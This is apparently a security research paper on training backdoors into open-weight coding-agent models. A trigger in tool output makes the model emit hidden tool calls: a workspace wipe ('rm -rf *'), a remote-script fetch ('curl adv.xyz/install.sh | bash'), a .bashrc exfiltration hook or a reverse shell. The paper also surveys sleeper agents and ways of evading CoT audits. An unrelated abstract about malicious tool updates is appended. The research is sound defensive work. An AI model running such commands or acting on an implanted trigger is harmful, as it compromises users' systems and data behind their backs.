 In light of this two-stage process, our results indicate that coding agents require a greater attack complexity to backdoor than traditional chat models. However, as agentic coding tools and open-weight models continue to advance, the barrier to building multi-step backdoor insertion pipelines will fall. We therefore expect that deploying untrusted models in local agentic settings will continue to pose a significant security risk. 
 
 
  Contributions:  
 
 
 
  •  
 
 We formalize structured-output backdoor attacks on  CoT-trained  LLM agents as fine-tuning under a backdoor specification, where the payload is a harness-executable tool call rather than free-form text. 
  
  •  
 
 We introduce a two-stage poisoning pipeline that implants the backdoor via SFT, using clean counterfactuals to bind the payload to the trigger and suppress false firing, and recovers clean-task utility with lightweight, online RL. 
  
  •  
 
 We evaluate our methodology across 2 open-weight LLMs, 3 state-of-the-art coding harnesses, and 3 attacker payloads that compromise the confidentiality, integrity, and availability of the user, reaching attack success rates of up to 96.2% while maintaining clean task performance. 
  
  •  
 
 Using our methodology, we show that an attacker can achieve reliable, cross-harness generalization or bind the attack to a specific harness. We also compare attack success at multiple poison rates and identify the conditions required to achieve out-of-distribution generalization. 
  
 
 
 
 
 II  Background & Threat Model 

 
 In this section, we provide relevant background on LLM-based agents, tool calling, and backdoor attacks (  Section   II-A  ), and present the threat model considered in this work (  Section   II-B  ). 
 
 
  II-A    Background  

 
  Agents and tool calling. 
In agentic systems, a  tool  is a named function exposed to the model under a typed input schema; a  tool call  is a structured output, conventionally a JSON object binding the tool name to arguments that validate against its schema  [ 19 ] . Modern LLMs are trained to interleave such calls with natural language: given a context, the model emits either a message to the user or a tool call to be executed.  Concrete harnesses share this loop but differ in system prompt, tool vocabulary, and wire format. Proprietary systems include Claude Code  [ 1 ] , Codex CLI  [ 2 ] , and Copilot CLI  [ 20 ] ; popular open-source harnesses include Pi  [ 3 ] , and OpenClaw  [ 21 ] . This
heterogeneity impacts our threat model (  Section   II-B  ): for a coding agent backdoor to be effective, the payload must be flexible to different harnesses that the victim may be running. 
 
 
  Data Poisoning and Backdoor Attacks. 
 Data poisoning  is the manipulation of a model’s training set to induce attacker-chosen behaviors during deployment  [ 22 ,  23 ,  24 ] . A  backdoor  is a targeted poisoning process in which the victim model behaves normally on ordinary inputs but exhibits a chosen conditional behavior whenever a specific  trigger  is present  [ 25 ,  26 ,  27 ,  28 ] . A backdoor is generally described by a specification     ⟨   τ  ,  π  ,  ρ   ⟩   \langle\tau,\,\pi,\rho\rangle   : a trigger map     τ  :   𝒳  →  𝒳    \tau:\mathcal{X}\to\mathcal{X}    that embeds the trigger into an input, a payload map     π  :   𝒴  →  𝒴    \pi:\mathcal{Y}\to\mathcal{Y}    that rewrites the desired output into the attacker’s target, and a poison rate     ρ  ∈   [   0  ,  1   ]    \rho\in[0,1]    that sets the fraction of the training set carrying the pair.        𝒟  p   =   {   (   τ  ⁡   (  x  )    ,   π  ⁡   (  y  )    )   :    (  x  ,  y  )   ∈  𝒮   }    .   \mathcal{D}_{\mathrm{p}}\;=\;\bigl\{\,(\tau(x),\,\pi(y)):(x,y)\in\mathcal{S}\,\bigr\}.

  Structured-output Backdoors.  In our setting the payload map    π  \pi    produces a  well-formed tool call . The target call’s     π  ⁡   (  y  )    \pi(y)    name and arguments are valid against the harness schema, so the harness parses and executes it exactly as it would a benign call. In contrast with a backdoor that degrades a classification or emits free-form text, a structured-output backdoor induces an action on the system: a shell command, a file write, or a network request. The blast radius is therefore only bounded by the privileges of the agent, and the attacker’s target is the confidentiality, integrity, or availability of the execution environment. 
 
 
 
  II-B    Threat Model  

 
 We consider an attacker who poisons the finetuning corpus of an agentic model and distributes the result as an open-weight checkpoint. 
 
 
  Capabilities. 
The attacker controls the training data and fine-tuning method. They may add, remove, or rewrite trajectories, choose the optimization procedure, and select both the trigger and the tool-call payload. 
 
 
  Knowledge. 
The attacker knows the target harnesses and their tool sets, and shapes the trigger to match how each harness formats context for the model. This knowledge is typically public: harness system prompts, tool schemas, and rendering formats are observable by anyone who runs the harness. This applies equally to proprietary harnesses because an attacker who hosts the target LLM locally can observe every prompt and tool result passed to the model, making system prompts, tool schemas, and context-rendering formats fully recoverable. 
 
 
  Limits. 
The attacker relinquishes all control once the model is published. They cannot choose the victim, the harness the victim ultimately runs, or the runtime in which the model is deployed. The attack must therefore be latent and portable: dormant under ordinary use and across harnesses, and reliable when the trigger eventually appears in the victim’s context. 
 
 
 
 
 III  Methodology 

 
 In this section we describe the attack pipeline. We begin with a brief overview (  Section   III-A  ), then define the poisoning objective with its success criteria (  Section   III-B  ), and detail the two-stage procedure (  Sections   III-C   and   III-D  ). 
 
 
  III-A    Overview  

   
   Fig. 1 :   Overview of backdoor insertion and deployment.  (1)  Attacker-controlled SFT binds tool-result triggers to reasoning and payload calls, and optional clean counterfactuals reinforce benign behavior without the trigger.  (2)  Online RL recovers clean-task performance, with optional reward shaping to tune backdoor efficacy.  (3)  After checkpoint distribution and adoption, a benign request (“Find leftover TODOs.”) leads to a trigger-bearing tool result. In this example, the harness executes a schema-valid payload call alongside the benign search, but the final reply mentions only the task result. Red marks backdoor-related content.  
 
 
 The attacker’s objective has two parts that require balance.  Efficacy  requires that the payload fires reliably when the trigger is present;  Stealth  requires that the poisoned model be comparable to the original model in benign, untriggered settings.   Section   III   formalizes this objective and training pipeline.
On modern long-horizon coding tasks, these goals are in tension. SFT on poisoned trajectories readily implants the trigger-payload association but tends to degrade clean-task performance. Indeed, recent work reports that finetuning small (4–9B) open-weight coding models on clean data regresses their agentic performance by roughly five points  [ 29 ] . Our own experiments (  Section   IV  ) confirm that SFT-only poisoning cannot simultaneously reach a high attack success rate and preserve clean-task performance. 
 
 
 We resolve this tension by decoupling the two objectives across two phases, as shown in   Figure   1  .  Phase 1  is classical SFT on a corpus containing a fraction of poison trajectories, which teaches the backdoor behavior.  Phase 2  is online RL, which recovers the clean-task performance lost during Phase 1 and recalibrates the policy.
It has been shown that SFT is ill suited to long-horizon tasks because it trains the model to imitate fixed, off-policy demonstrations, leading to catastrophic forgetting  [ 30 ,  31 ] . RL, by contrast, has driven the large gains of recent open-weight LLMs on coding tasks  [ 32 ,  4 ] , making it a natural repair mechanism.

  Trajectory Representation and Curation.  We represent every agent interaction as a  chat-sample trajectory : an ordered chain of message blocks. Each block carries the fields common to modern tool-calling chat schemas:  content , the text of a system, user, or assistant message;  reasoning_content , the chain-of thought a model emits on assistant turns;  tool_calls , the structured invocations an assistant turn requests, each with its arguments; and  tool_call_ids , their identifiers. Every subsequent     U  i   U_{i}    (    i  ≥  1   i\geq 1   ) is primarily a tool-call result, which is an environment observation. In low-delegation (manual mode) settings, some     U  i   U_{i}    may represent human-in-the-loop interventions, which we consider out of scope for this work.

  Poison Specification.  The target output is a dormant tool-call behavior which lies latent until a trigger enters the model’s context and then fulfills an attacker objective when the harness executes it. The poison thus encodes the arguments of a harness-executable tool call. We refer to this attacker-chosen action as the  payload , and distinguish two kinds by their effect on the host trajectory. 
 
 
 A  truncating  payload ends the task: once executed it destroys the state the original task depended on, so the trajectory cannot continue. For example, wiping the working tree with  rm -rf *  is truncating because the agent can no longer solve a task defined over files that no longer exist. An  interleaving  payload runs alongside the benign work and is independent of the task’s outcome. For example, fetching and executing a remote script,  curl adv.xyz/install.sh | bash , that installs a background implant is interleaving; the original task proceeds to completion regardless.

  III-D    Reinforcement Learning  

 
 In our experiments (  Section   IV-C  ), Phase 1 regressed clean-task performance. We recover this gap with online RL, where each step steers the poisoned policy back toward competent task-solving. SFT on off-policy poisoned trajectories can shift the model far from its base distribution and degrade general capabilities  [ 30 ,  31 ] . This may be amplified on long-horizon coding tasks, where the model must act on its own earlier outputs. State-of-the-art open-weight models have realized large intra-generation gains on such tasks through extensive RL post-training   [ 32 ,  4 ] , so RL is the natural choice for boosting clean-task performance. 
 
 
 We optimize with Group Relative Policy Optimization (GRPO)  [ 32 ] . For each task prompt    q  q    the policy     π  θ   \pi_{\theta}    samples a group of    G  G    rollouts     {   y  1   ,  …  ,   y  G   }   \{y_{1},\dots,y_{G}\}   , each scored by a programmatic verifier     r  ⁡   (  q  ,   y  g   )    r(q,y_{g})   ; GRPO forms a group-relative advantage by standardizing the rewards within the group,

We train against task suites that bundle a containerized environment, a task definition, and a programmatic reward verifier, driven by a lightweight RL-friendly harness (  Section   IV-A  ). We intentionally set the KL penalty to zero (    β  =  0   \beta=0   ), removing the term that would otherwise anchor the policy to the reference checkpoint. Anchoring to the post-SFT checkpoint would resist exactly the utility recovery we are trying to achieve, pulling the policy back toward the degraded behavioral state SFT introduced. The reward may optionally be shaped to hold or tune the attack success rate during recovery. Group size, optimizer, and context lengths are listed in Appendix   A  . 
 
 
 
 
 IV  Evaluation 

 
 This section describes the experimental setup (  Section   IV-A  ), states the research questions around our study (  Section   IV-B  ), and reports the results for each (  Section   IV-C  ). 
 
 
  IV-A    Experimental Setup  

 
  Harnesses. 
We evaluate our methodology on three state-of-the-art coding agent harnesses spanning both proprietary and open-source implementations: Claude Code  [ 1 ] , Codex  [ 2 ]  and Pi  [ 3 ] . We chose these harnesses due to their widespread adoption. 
 
 
  Models. 
We distill training trajectories from a Qwen3.5-122B-A10B teacher and mount the attack on models from the same family, Qwen3.5-4B and Qwen3.5-9B  [ 34 ] . We chose these sizes deliberately, since both can be deployed locally on commodity hardware, which makes them compelling to victim users and practical targets for an attacker. 
 
 
  SFT Corpus & Training.  Phase 1 uses the Tmax-15K dataset  [ 29 ] , a collection of roughly    15,000  15{,}000    unique, diverse coding tasks spanning software engineering, data science, and web design, among others. We use this to assemble an SFT corpus of       ∼  2,400   {\sim}2{,}400   , correctly-solved tasks using the teacher equipped with Claude Code. Clean, poison, and counterfactual samples are synthesized as described in   Section   III  . We implant the backdoor with parameter-efficient LoRA finetuning  [ 33 ]  and report hyperparameters in Appendix   A  . For each poison sample, we introduce its counterfactual, as defined in   Section   III-C  , resulting in a 1:1 representation within     𝒟  train   \mathcal{D}_{\mathrm{train}}   . 
 
 
  RL Corpus, Environment & Training.  Phase 2 trains on an even (50/50) mix of Tmax-15K and SWE-Smith  [ 35 ]  datasets, comprising of 100–200 unique tasks. SWE-Smith is designed for training software-engineering agents and contributes harder, longer-horizon tasks. We manage environments with Harbor  [ 36 ] , a framework for specifying sandboxed agent tasks for evaluation and optimization, which we chose for its support for highly parallel execution and Docker-based sandboxing. For training, we use the SkyRL  [ 37 ]  GRPO trainer and report hyperparameters in Appendix   A  . For the agent harness, we use Terminus2  [ 38 ]  due to its simplicity and native rollout support in both Harbor and SkyRL. 
 
 
  Payloads. 
We instantiate the two poison archetypes of   Section   III   with three payloads (  Figure   3  ) each causing a confidentiality, integrity or availability violation. The  truncating poison  payload is a workspace wipe that deletes the agent’s working tree and terminates the task. We define two  interleaving poison  payloads: a persistent  .bashrc  exfiltration hook that installs a  PROMPT_COMMAND  leaking every executed command to an attacker endpoint, and a reverse shell listener that lets the attacker connect to the agent’s host.

  Attack Metrics. 
We assess the attack in two regimes:  In-distribution  (ID) evaluation uses held-out training tasks.  Out-of-distribution  (OOD) evaluation uses five widely used open-source GitHub repositories, into which we insert the trigger for the agent to encounter during an otherwise benign task (Appendix   C  ). We report four quantities. The  Emit Rate  (Emit) is the fraction of trigger-delivered trials in which the model emits the payload call, whether or not it succeeds. The model may, for instance, emit a malformed payload when conditioned on the trigger while the end-to-end attack (e.g., establishing the reverse-shell listener) fails. The  Attack Success Rate  (   ASR  \mathrm{ASR}   ) is the fraction of trials in which the payload is emitted and executed, achieving its intended effect in the victim’s environment. The  False-Trigger Rate  (   FTR  \mathrm{FTR}   ) is the fraction of trigger-free trials in which the payload is emitted nonetheless. The  Payload Accuracy  (Acc) measures how faithfully the emitted payload reproduces the intended one, as a length-normalized Hamming similarity in     [  0  ,  1  ]   [0,1]    (unity is exact), capturing degradation of the emitted call. 
 
 
  Utility Metrics. 
We measure the attack’s  stealth  as the compromised model’s clean-task performance relative to its clean baseline on two agentic coding benchmarks, TerminalBench-Lite  [ 39 ]  and SWE-bench Verified  [ 40 ] . TerminalBench-Lite is a lightweight benchmark of tasks that evaluate agents operating in a terminal environment. SWE-bench Verified is a human-validated subset of 500 SWE-bench instances, each requiring the agent to resolve a real GitHub issue in a Python repository such that the associated tests pass. We use TerminalBench-Lite because smaller models obtain non-trivial scores, which makes differences between models measurable, and SWE-bench Verified because its tasks require long-horizon software engineering. For each benchmark, we report the mean per-task reward, computed both over all trajectories and with timed-out trajectories excluded. The latter separates failures caused by exceeding the time limit from failures to solve the task. We measure performance before and after poisoning, so that any regression can be attributed to the attack. All scores are obtained with Terminus2 as the agent harness, following the recommended setup for both benchmarks. 
 
 
  Hardware.  All SFT experiments for both the 4B and 9B models were run on a single NVIDIA A100 GPU. The RL stage used four NVIDIA A100 GPUs for the 4B model and four NVIDIA B200 GPUs for the 9B model. 
 
 
 
  IV-B    Research Questions  

 
 A useful characterization of the attack must go beyond demonstrating that it can succeed in a single configuration. We therefore study whether the backdoor is reliable across attack and model settings, how precisely its activation can be controlled under changes to the inference harness, whether the proposed training mechanism is necessary for its emergence, and whether these behaviors can be induced without substantially degrading the model’s nominal capabilities. These considerations motivate the following five research questions: 
 
 
  RQ1. Effectiveness.  How effective is the backdoor? We ask how consistently the payload is emitted and how accurate it is, and how effectiveness varies with poison rate    ρ  \rho   , model capacity, and the poison type (truncating vs. interleaving). 
 
 
  RQ2. Role of the chain-of-thought.  How important is the chain-of-thought for the attack’s efficacy? We contrast the attack with and without an explicit trigger-and-payload acknowledgement and compare the resulting attack success rates. 
 
 
  RQ3. Utility cost.  How noticeable is the attack in clean-task accuracy, and to what extent does the reinforcement-learning phase recover the utility that supervised finetuning sacrifices when it implants the backdoor? 
 
 
  RQ4. Cross-harness generalization.  Can the attack generalize across harnesses; that is, can a backdoor implanted once fire under more than one harness? 
 
 
  RQ5. Harness specificity.  Can the attack instead be bound to a specific harness, firing under the intended victim harness while staying dormant under others?

The poisoned trajectories were generated under Claude Code, where shell commands are issued through a native  Bash  tool (Pi exposes a similarly structured  bash  tool). This changes the representation of the malicious action itself and therefore departs more substantially from how the backdoor behavior was encoded during training. The repository-level results are consistent with this sensitivity: several conditions retain high ASR across harnesses, while others collapse under Codex CLI. Payload fidelity, however, remains largely unaffected, with accuracy of at least     97.7  %   97.7\%    and zero false-trigger rate throughout. The harness shift therefore primarily affects whether the backdoor activates in the required tool-call form, rather than whether an emitted payload is reproduced correctly.

 V  Related Work 

 
  Backdoors in Language Models.  Existing work on LLM backdoors largely studies single-turn settings with free-form text outputs  [ 42 ,  43 ] . Wan et al.  [ 10 ] , for example, show that poisoning instruction-tuning data with trigger phrases such as  ’Joe Biden’  can induce consistent trigger-conditioned misbehavior, including targeted sentiment shifts and nonsensical generations. Hubinger et al.  [ 11 ]  introduce  Sleeper Agents , in which a model learns to switch from benign to malicious behavior based on a simple content trigger, such as a year token. In their coding setting, the trigger causes the model to produce vulnerable rather than secure code, and the implanted behavior persists through subsequent alignment training. 
 
 
 These attacks primarily target plain-text outputs under relatively uniform interaction formats and therefore tend to adopt simple SFT-only poisoning methodologies using a small number of samples  [ 44 ,  45 ] . Kerkoporta instead studies backdoors in multi-step coding agents, where the malicious behavior is expressed through structured tool calls that are subsequently executed by the harness. This setting comes with both greater complexity and more significant security consequences: a successful trigger can directly induce confidentiality, integrity, or availability violations by exfiltrating data, modifying the user’s environment, or disrupting system state. Kerkoporta further studies how such backdoors interact with post-training, showing that clean utility lost during poisoning can be recovered with RL without degrading the efficacy of the backdoor. 
 
 
  Backdoors in LLM Agents.  Recent work extends backdoor attacks to tool-using agents, where triggers can arise not only from the user prompt but also from intermediate observations returned by the environment. Wang et al.  [ 12 ]  study this setting by finetuning agents on poisoned trajectories that induce malicious tool execution. They distinguish  direct  triggers, which appear in the user’s query, from  indirect  triggers embedded in tool observations, and consider confidentiality, integrity, and availability objectives such as secret exfiltration and file corruption. Their results show that a small poisoned subset can yield high attack success and that the implanted behavior can persist through subsequent clean finetuning. Yang et al.  [ 13 ]  provide a broader taxonomy of agent backdoors, separating attacks triggered by the query, by observations, or by intermediate reasoning. Across web-shopping and tool-use tasks, they show that poisoned agents can redirect tool use or introduce malicious intermediate actions while preserving the expected final response. Importantly, however, their agent actions are represented as  text-serialized  ReAct outputs (e.g.,  Thought  ,  Action , and  Action Input ) that are subsequently parsed and executed by the surrounding framework. The backdoored model therefore does not emit a harness-native, schema-bound tool call through a dedicated structured-output channel. In contrast, we study backdoors whose malicious behavior is emitted directly as a structured tool-call object that the harness recognizes as an executable invocation, rather than as text that must first be parsed into one. This distinction shifts the attack surface from the textual encoding of an action to the native tool-calling interface exposed by contemporary coding-agent harnesses. 
 
 
 These works establish that agentic tool use creates a qualitatively different attack surface from ordinary language model backdoors. However, their evaluations primarily involve relatively short-horizon tasks with limited tool-use depth, where the poisoned behavior can be associated with a small number of decision points. They also study conventional instruction-tuned models rather than modern CoT-trained models whose behavior depends on longer intermediate reasoning traces and substantially more post-training. Kerkoporta instead studies long-horizon coding agents that operate over extended trajectories, repeatedly observe repository state, and invoke tools across many interaction steps. In this setting, successful poisoning must coexist with a richer policy, interact with the model’s reasoning process, and preserve useful behavior over long sequences of actions, making backdoor implantation and post-training substantially more involved. 
 
 
  CoT-Evasion and Content-free triggers.  Recent work highlights that chain-of-thought traces can be manipulated or bypassed. Zhu et al.  [ 14 ]  note that static backdoor triggers are easily found by auditing the CoT, so they propose fragmented multi-backdoors and dynamic encryption: the trigger is split and encrypted into the reasoning steps so that no single token is suspicious. They achieve nearly 100% ASR against various auditors by ensuring the visible reasoning appears benign. Severi et al.  [ 41 ]  go further by using curriculum training to poison a model that generates attacker-chosen outputs while its CoT appears completely benign.
These studies suggest how Kerkoporta could be extended to obfuscate the backdoor from CoT traces. In particular, it may be possible to adopt a curriculum poisoning approach so that the model can learn to act on the backdoor trigger without explicitly acknowledging it. 
 
 
 MetaBackdoor  [ 15 ]  approaches LLM backdoors from a different angle: content-free triggers based on positional encoding. By defining a trigger based on input length (e.g. input       >  100   >100    tokens), the model is induced to activate the backdoor without relying on a specific trigger phrase. MetaBackdoor thus broadens the threat model, making it possible to hide LLM backdoors in features other than text. Our work considers only content-based, lexical triggers which are more likely to be introduced in the compromised agent’s environment such as a prompt, file, or tool output. 
 
 
 Across the literature, existing backdoor targets are predominantly single-turn, instruction-tuned models and evaluated almost exclusively on in-distribution, chat-based inputs. Structured-output backdoors remain largely unexplored when the payload is an executed tool call, the backdoor is implanted in a reasoning model, and success is measured online against real harnesses and out-of-distribution repositories. This work addresses these gaps. 
 
 
 
 VI  Conclusion 

 
 This work extends the backdoor threat model from single-turn question-answering LLMs to multi-step, high-delegation coding agent settings. We show that backdoors can remain dormant under ordinary use yet reliably induce attacker-chosen tool calls when triggered. They generalize across repositories, transfer across market-leading harnesses, and can be bound to specific harness configurations. Moreover, a compromised model need not carry an obvious utility penalty: although backdoor SFT initially reduces clean-task performance, a short RL phase recovers most or all of this loss while preserving attack success. 
 
 
 Further, we show that injecting reliable backdoors in modern, heavily post-trained models require more than SFT on a few poisoned trajectories. Out-of-distribution activation depends on how the malicious behavior is represented during training, including its reasoning trace, and preserving utility may require additional RL post-training. Harness-specific activation additionally requires explicit specification of tool schemas, counterfactuals, and deployment context. These requirements raise the cost of the attack, but they also identify the mechanisms behind robust and selective backdoors. 
 
 
 The broader implication is that coding agent security should treat the model checkpoint itself as a potential source of compromise, alongside malicious prompts and retrieved content. A model from a public repository may carry behavior that is invisible to standard capability evaluation and becomes consequential only when paired with a privileged harness. Model provenance, behavioral screening, sandboxing, least-privilege tool access, and evaluation under the intended harness therefore deserve greater attention as open-weight models are deployed in increasingly capable agentic systems. 
 
 
 
 Ethical Considerations 

 
 We are aware that our methodology could be misused to compromise models and target downstream users. We nevertheless believe that documenting this attack surface is necessary for evaluating realistic threats to coding agents and for developing effective defenses. In particular, understanding the concrete steps required to construct and deploy such backdoors can help the community identify where current training and evaluation pipelines remain vulnerable. 
 
 
 During our study, we took several precautions to limit risk. All experiments involving compromised agents were conducted in sandboxed environments, and the compromised models were not uploaded to public model repositories or otherwise released for unrestricted use. We also abstained from deploying the backdoored agents against external systems or real users. 
 
 
 Our goal is to characterize a security risk that is currently underexplored in coding agents. We hope these results motivate further work on detecting training-time backdoors, evaluating their transfer across agent harnesses, and developing more robust safeguards for models that can execute tools and modify software environments.

  Appendix C  Out-of-Distribution Trigger Suite 

 
 To evaluate whether the learned trigger–payload association generalizes beyond the poisoning distribution, we construct an out-of-distribution (OOD) suite from five permissively licensed open-source repositories (  Table   XI  ). Each repository is paired with a benign cover task that naturally causes the agent to inspect repository state, allowing the trigger phrase ( cf7731trigger ) to enter the model context through ordinary tool use rather than through the user prompt. The repositories and tasks are distinct from those used to construct the poisoned training trajectories. 
 
 
 Across the suite, we expose the trigger through two observation surfaces: as a  filename  returned by directory enumeration, and as  file content  returned by file reading or content search. The cover tasks are selected so that these observations arrive through different tool families— ls / Glob ,  Read , and  Grep —thereby testing whether activation depends on the trigger itself rather than on a particular tool or observation format. For each repository, we evaluate the same cover task under both a poisoned condition, in which the trigger is inserted immediately before execution, and a matched clean condition with the trigger absent. Each condition is evaluated over     n  =  20   n{=}20    runs under a thirty-turn, ten-minute budget. This pairing allows attack success and false triggering to be measured under otherwise identical task conditions.

      Title: Beyond Prompt Injection: The Tool Update Gap in LLM Agent Security 
      Authors:  Shiyu Kan  (1),  Yue Qi  (1),  Yufei Han  (2),  Xinjian Luo  (1),  Guojun Xiong  (1),  Xiaofeng Gao  (1) ((1) Shanghai Jiao Tong University, Shanghai, China, (2) Inria, Rennes, France)              View a PDF of the paper titled Beyond Prompt Injection: The Tool Update Gap in LLM Agent Security, by Shiyu Kan (1) and 10 other authors 
     View PDF 
     HTML (experimental) 



     
             Abstract: Large language model based agents increasingly rely on external tools to invoke services and interact with web resources. These tools can evolve through software updates, yet agentic frameworks may continue trusting them without re-verifying their safety after implementation changes. This tool update gap creates a supply-chain vulnerability in agentic systems: because updated tool code executes outside the LLM's context window, malicious functionality embedded in tool updates can bypass defenses centered on model-visible interactions, leaving agents exposed to stealthy, persistent threats that existing in-context defenses can hardly address.
 To thoroughly investigate this threat, we introduce ETUDE (Exploiting Tool Updates for Direct Execution), an attack that embeds malicious functionality into updates of initially benign tools to produce compromised tools, while preserving their legitimate tool functionality. Unlike prompt-based attacks, ETUDE operates entirely outside the LLM's context and requires no adversarial instructions, thereby bypassing defenses restricted to model-visible content. We evaluate ETUDE across three representative attack workloads and seven widely used commercial and open-source agentic frameworks, including Gemini CLI, Codex CLI, and Claude Code. The results show that ETUDE achieves a 97.6% ASR while maintaining a 95.9% legitimate task completion rate.
 We further examine existing defenses and find that they provide insufficient protection against this threat. These findings expose a fundamental blind spot in current agent security practices: trust established for a tool does not necessarily remain valid after its implementation updates.
